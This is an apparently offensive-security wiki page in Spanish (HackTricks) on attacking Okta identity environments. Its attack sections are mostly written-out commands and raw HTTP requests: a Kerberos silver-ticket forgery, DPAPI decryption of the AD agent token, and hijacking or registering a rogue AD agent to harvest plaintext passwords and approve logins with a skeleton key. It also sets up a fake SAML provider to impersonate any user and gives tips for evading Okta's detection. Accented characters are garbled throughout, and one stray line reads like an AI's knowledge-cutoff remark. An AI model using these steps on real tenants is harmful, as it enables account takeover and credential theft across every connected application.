# Seguridad de Okta

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop).
* Obt√©n [**productos oficiales de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## Informaci√≥n b√°sica

Okta, Inc. es una empresa de **gesti√≥n de identidad y acceso** que proporciona software en la nube para ayudar a las empresas a **administrar y asegurar la autenticaci√≥n de usuarios en aplicaciones modernas**, y para que los desarrolladores puedan construir controles de identidad en aplicaciones, servicios web y dispositivos.

Su servicio principal, llamado Okta Identity Cloud, ofrece productos que incluyen inicio de sesi√≥n √∫nico (SSO), autenticaci√≥n multifactor (MFA), gesti√≥n del ciclo de vida, directorio universal, gesti√≥n de acceso a API y m√°s. Esto ayuda a las empresas a proteger sus datos sensibles y tambi√©n a agilizar el acceso de los usuarios, haciendo que las aplicaciones y servicios sean m√°s accesibles y f√°ciles de usar para empleados o clientes.

Los servicios de Okta se utilizan ampliamente en contextos empresariales, as√≠ como por empresas m√°s peque√±as y desarrolladores. Juega un papel crucial en permitir a las empresas adoptar y gestionar de forma segura las tecnolog√≠as en la nube. Hasta mi fecha l√≠mite de conocimiento en septiembre de 2021, Okta sigue siendo un actor importante en la industria de la gesti√≥n de identidad y acceso (IAM).

{% hint style="danger" %}
El objetivo principal de Okta es configurar el acceso de diferentes usuarios y grupos a aplicaciones externas. Si logras **comprometer privilegios de administrador en un entorno de Okta**, es muy probable que puedas **comprometer todas las dem√°s plataformas que la empresa est√© utilizando**.
{% endhint %}

{% hint style="success" %}
Para realizar una revisi√≥n de seguridad de un entorno de Okta, debes solicitar acceso de solo lectura de **administrador**.
{% endhint %}

### Resumen

Existen **usuarios** (que pueden estar **almacenados en Okta**, registrados desde **proveedores de identidad** configurados o autenticados a trav√©s de **Active Directory** o LDAP). \
Estos usuarios pueden estar dentro de **grupos**.\
Tambi√©n existen **autenticadores**: diferentes opciones para autenticar como contrase√±a, y varios 2FA como WebAuthn, correo electr√≥nico, tel√©fono, Okta Verify (pueden estar habilitados o deshabilitados)...

Luego, hay **aplicaciones** sincronizadas con Okta. Cada aplicaci√≥n tendr√° alg√∫n **mapeo con Okta** para compartir informaci√≥n (como direcciones de correo electr√≥nico, nombres...). Adem√°s, cada aplicaci√≥n debe estar dentro de una **Pol√≠tica de Autenticaci√≥n**, que indica los **autenticadores necesarios** para que un usuario pueda **acceder** a la aplicaci√≥n.

{% hint style="danger" %}
El rol m√°s poderoso es el de **Super Administrador**.

Si un atacante compromete Okta con acceso de administrador, es muy probable que todas las **aplicaciones que conf√≠an en Okta** sean comprometidas.
{% endhint %}

## Ataques

### Localizar el portal de Okta

Por lo general, el portal de una empresa se encuentra en **nombredeempresa.okta.com**. Si no es as√≠, prueba con **variaciones** simples de **nombredeempresa**. Si no puedes encontrarlo, tambi√©n es posible que la organizaci√≥n tenga un registro **CNAME** como **`okta.nombredeempresa.com`** que apunta al portal de Okta.

### Iniciar sesi√≥n en Okta a trav√©s de Kerberos

(Ataque copiado [**de aqu√≠**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si existe un dominio como **`nombredeempresa.kerberos.okta.com`**, entonces Kerberos est√° configurado dentro de la empresa para acceder a Okta. Esto es muy interesante, ya que normalmente los usuarios de Windows no necesitar√°n MFA para acceder a Okta.

Tambi√©n es posible encontrar usuarios de Kerberos configurados con acceso a Okta dentro del entorno de AD en ejecuci√≥n:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Con un ticket obtenido para el usuario de AD, necesitamos inyectarlo en un host que controlemos usando Rubeus o Mimikatz:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Debes asegurarte de que `clientname.kerberos.okta.com` est√© agregado a la zona de seguridad "Intranet" en las Opciones de Internet. Luego, en nuestro navegador, si accedemos a la siguiente URL, deber√≠amos recibir una respuesta JSON que proporciona un resultado `OK` cuando se acepta el ticket Kerberos:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Dir√≠gete al panel de control de Okta y, si todo est√° bien, iniciar√°s sesi√≥n.

Adem√°s, si logramos comprometer la cuenta de servicio de Okta real exponiendo el SPN de delegaci√≥n, podemos realizar un ataque de Silver Ticket.

Cabe destacar que como Okta solo admite AES para el cifrado de tickets, debemos asegurarnos de tener la clave AES o la contrase√±a en texto plano para autenticarnos:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Para crear nuestro ticket para el usuario v√≠ctima `testuser`, usamos:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

Y nuevamente, env√≠elo a Okta a trav√©s de nuestra sesi√≥n del navegador:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Secuestro del agente AD de Okta

(Ataque copiado [**desde aqu√≠**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si accede a un servidor que ejecuta el agente AD de Okta. Este agente es responsable de sincronizar los usuarios y grupos del dominio en Okta para aprovisionamiento, y tambi√©n de responder a las solicitudes de autenticaci√≥n de Okta a medida que los usuarios inician sesi√≥n en el portal.

De forma predeterminada, el agente se instala en:
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Vamos a echar un vistazo al archivo `OktaAgentService.exe.config`, que contiene algunos fragmentos interesantes de XML:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

El `AgentToken` codificado en Base64 es donde nos enfocamos. Si abrimos `OktaAgentService.exe` en dnSpy, podemos ver c√≥mo se descifran estos valores:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

¬°As√≠ es! ¬°El buen y viejo DPAPI! El valor de `RandomEntropy` se establece en:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Esto significa que podemos descifrar este valor XML codificado en Base64 usando:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
La clave maestra DPAPI utilizada pertenece a la cuenta de usuario que ejecuta el servicio "Okta AD Agent", por lo que deber√° ejecutar lo anterior en el contexto de la cuenta de servicio o obtener la clave maestra de la cuenta y descifrarla:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Por ejemplo, dentro de `OktaAgentService.exe.config` tenemos dos campos XML adicionales, `APPID` y `AGENTID`. Combinados con el `AgentToken`, podemos realizar una solicitud `GET` de la siguiente manera:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Esta llamada se bloquear√° hasta que un usuario se autentique en Okta (o la solicitud agote el tiempo), en cuyo caso devolver√° el siguiente nombre de usuario y contrase√±a proporcionados en texto claro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Mientras esto permite capturar credenciales, tambi√©n tenemos la oportunidad de responder a este intento de autenticaci√≥n si queremos hacer algo como proporcionar una llave maestra. Hacemos esto emitiendo la siguiente solicitud HTTP:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
El resultado de emitir esta solicitud es permitir la autenticaci√≥n para cualquier usuario a trav√©s de Okta.

### Secuestro de AD como administrador

(Ataque copiado [**desde aqu√≠**](https://trustedsec.com/blog/okta-for-red-teamers)).

Sabemos que podemos secuestrar un Agente AD de Okta usando un Token de Agente robado, pero ¬øqu√© pasa si hemos comprometido una cuenta privilegiada de Okta y queremos hacer esto sin un token de agente existente? Veamos c√≥mo hacerlo.

Primero, necesitamos crear un token de API de Agente AD de Okta. Para iniciar el flujo de autenticaci√≥n, necesitamos un C√≥digo OAuth. Para obtener esto, comenzamos dirigi√©ndonos a:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

Esto te mostrar√° un cuadro de di√°logo de permisos para que lo aceptes:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Aceptar el cuadro de di√°logo te redireccionar√° a `/oauth-response` junto con un par√°metro `code`:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Necesitamos tomar este par√°metro `code` y solicitar un token de API usando la solicitud POST:
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
La respuesta nos devuelve nuestro token de API:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
Usando este token, necesitamos asociarlo con un dominio AD activo. Hacemos esto utilizando la llamada a la API:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Esto nos devolver√° la siguiente respuesta XML, donde necesitamos conservar el valor del atributo `id` para m√°s adelante.
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
A continuaci√≥n, realizamos una llamada a la API HTTP para nombrar nuestro conector:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
Esto devolver√° una respuesta XML donde nuevamente necesitamos conservar el atributo `id`:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

Finalmente, inicializamos la conexi√≥n para permitir recibir datos:
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Con esto hecho, nuestro agente AD falso est√° listo y procesar√° los intentos de autenticaci√≥n como se mostr√≥ anteriormente.

Obviamente, no queremos hacer todo esto usando Burp, por lo que se ha creado una herramienta para admitir algunos casos de uso. Esta est√° disponible [aqu√≠](https://github.com/xpn/OktaPostExToolkit).

El primer modo en el que podemos ejecutar esta herramienta es el modo `token`, que toma un valor de Token de Agente comprometido y se conectar√° a la API de Okta, volcando cualquier credencial que reciba:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

Ejemplos de video:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

La herramienta tambi√©n permite registrar un nuevo conector de AD si tenemos credenciales administrativas disponibles para un usuario de Okta que est√© utilizando:
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Proveedor Falso de SAML de Okta

(Ataque copiado [**desde aqu√≠**](https://trustedsec.com/blog/okta-for-red-teamers)).

Otra t√©cnica que ha sido muy √∫til durante las evaluaciones es la implementaci√≥n de un proveedor falso de SAML.

Recientemente, Okta proporcion√≥ [una actualizaci√≥n de seguridad](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sobre ataques en la naturaleza utilizando esta t√©cnica, por lo que es √∫til conocer esto al simular actividad en un entorno, especialmente para clientes que deseen probar sus detecciones de este ataque en particular.

Si tenemos acceso a una cuenta elevada de Okta, podemos implementar un proveedor de identidad externo como parte de la funcionalidad de Okta. Esto permite que proveedores externos como Entra ID completen la autenticaci√≥n antes de redirigir al usuario a Okta para seleccionar aplicaciones integradas.

Pero, ¬øqu√© sucede si controlamos el IDP? Bueno, tiene sentido que en este caso, podamos aprobar cualquier solicitud de autenticaci√≥n que deseemos.

Para probar esto, necesitamos implementar un proveedor de identidad personalizado. Se puede encontrar un proveedor de identidad SAML muy rudimentario que admite nuestras actividades maliciosas [aqu√≠](https://github.com/xpn/OktaPostExToolkit). La idea principal detr√°s de esta herramienta es permitirnos emitir respuestas de autenticaci√≥n SAML firmadas que correspondan a cualquier usuario que deseemos.

Este servidor escuchar√° las solicitudes HTTP entrantes en `/saml`, por lo que primero necesitamos implementar un IDP en Okta.

Primero, seleccionamos el IDP SAML 2.0:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Al configurar el IDP, debemos prestar atenci√≥n a algunas configuraciones. La primera es el `Nombre`, que es el nombre amigable que se mostrar√° a otros administradores de Okta.

A continuaci√≥n, est√° la URL del emisor, que debe establecerse en el valor de un identificador en formato URI. Nuevamente, esto puede ser cualquier cosa, pero usaremos `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Tambi√©n necesitamos configurar el campo `URL de inicio de sesi√≥n √∫nico del IDP` en la ubicaci√≥n donde se est√° ejecutando nuestro servidor SAML. Ahora, lo interesante es que ESTO NO necesita ser una URL que apunte a nuestro servidor. Creo que vale la pena se√±alar esto porque podemos ser bastante creativos en la URL que ingresamos aqu√≠ y dificultar un poco el trabajo del equipo de seguridad. Por ejemplo, podemos configurar este campo como algo como `https://idp.google.com/saml` si queremos, y lo √∫nico que necesitamos hacer es capturar la solicitud SAML entrante. Aqu√≠ est√° lo interesante: la solicitud SAML se reenv√≠a del lado del cliente. Con esto quiero decir que Okta generar√° la `AuthRequest` de SAML y har√° que nuestro navegador se redirija a `https://idp.google.com/` junto con la solicitud SAML. Esto, por supuesto, significa que podemos simplemente modificar el archivo de hosts local para que `idp.google.com` apunte a `127.0.0.1`:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
Tambi√©n necesitamos un certificado de firma que controlemos. Esto puede ser auto-firmado y generado usando OpenSSL con:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Una vez generada la clave, simplemente subimos el certificado a Okta y creamos nuestro IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Finalmente, debemos asegurarnos de que `Match Against` est√© configurado como `Okta Username or Email` y `Account Link Policy` est√© configurado como `Automatic` para permitirnos autenticarnos en las cuentas existentes de Okta:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Una vez guardado todo, debemos descargar los metadatos:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Luego, para iniciar la solicitud de autenticaci√≥n y emitir la `AuthRequest`, navegamos a la URL que se muestra en `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Al navegar a esta URL, se produce una redirecci√≥n a nuestro servidor SAML interno:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Si proporcionamos una direcci√≥n de correo electr√≥nico, descubrimos que podemos autenticarnos como cualquier usuario de Okta sin necesidad de conocer sus credenciales.

Veamos esto en acci√≥n en [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing del portal de Okta con Evilgnix

En [**esta publicaci√≥n de blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) se explica c√≥mo preparar una campa√±a de phishing contra un portal de Okta.

### Ataque de suplantaci√≥n de compa√±ero

Los **atributos que cada usuario puede tener y modificar** (como el correo electr√≥nico o el nombre) se pueden configurar en Okta. Si una **aplicaci√≥n** conf√≠a en un **atributo** como ID que el usuario puede **modificar**, podr√° **suplantar a otros usuarios en esa plataforma**.

Por lo tanto, si la aplicaci√≥n conf√≠a en el campo **`userName`**, probablemente no podr√°s cambiarlo (porque normalmente no se puede cambiar ese campo), pero si conf√≠a, por ejemplo, en **`primaryEmail`**, es posible que puedas **cambiarlo por la direcci√≥n de correo electr√≥nico de un compa√±ero** y suplantarlo (necesitar√°s tener acceso al correo electr√≥nico y aceptar el cambio).

Ten en cuenta que esta suplantaci√≥n depende de c√≥mo se haya configurado cada aplicaci√≥n. Solo las que conf√≠en en el campo que modificaste y acepten actualizaciones se ver√°n comprometidas.\
Por lo tanto, la aplicaci√≥n deber√≠a tener este campo habilitado si existe:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Tambi√©n he visto otras aplicaciones que eran vulnerables pero no ten√≠an ese campo en la configuraci√≥n de Okta (al final, las diferentes aplicaciones se configuran de manera diferente).

La mejor manera de averiguar si puedes suplantar a alguien en cada aplicaci√≥n ser√≠a intentarlo.

## Evadir pol√≠ticas de detecci√≥n de comportamiento <a href="#9fde" id="9fde"></a>

A menos que se haya revelado de antemano, probablemente no sabr√°s si se han implementado pol√≠ticas de detecci√≥n de comportamiento de Okta hasta que te encuentres con ellas. Una **forma potencial de evadir las pol√≠ticas de detecci√≥n de comportamiento de Okta** es simplemente **evitar el panel principal de Okta** y dirigirse directamente a las aplicaciones de Okta (estas ser√≠an las aplicaciones en la captura de pantalla anterior que est√°n ocultas por cajas rojas). Si tienes un token de acceso de Okta, en lugar de reproducir el token en la p√°gina de inicio de sesi√≥n principal de Okta de la empresa objetivo, reproducir√°s el token en la URL espec√≠fica de la aplicaci√≥n de Okta.

Otras recomendaciones son:

* Tener cuidado al reproducir tokens de acceso capturados desde proxies de anonimizaci√≥n populares y servicios de VPN.
* Al reproducir un token de acceso, utilizar la misma cadena de agente de usuario utilizada por el cliente.
* Tener cuidado al reproducir tokens de acceso capturados de usuarios separados desde la misma direcci√≥n IP.
* Tener cuidado al reproducir tokens de acceso capturados contra el panel de control de Okta.
* Si conoces las direcciones IP de las empresas que utilizar√°n las v√≠ctimas, considera bloquear todo el tr√°fico que no sea de esa IP o rango de IP.

## Fortalecimiento de Okta

Okta tiene muchas configuraciones posibles, en esta p√°gina encontrar√°s c√≥mo revisarlas para que sean lo m√°s seguras posible:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## Referencias

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, ¬°consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
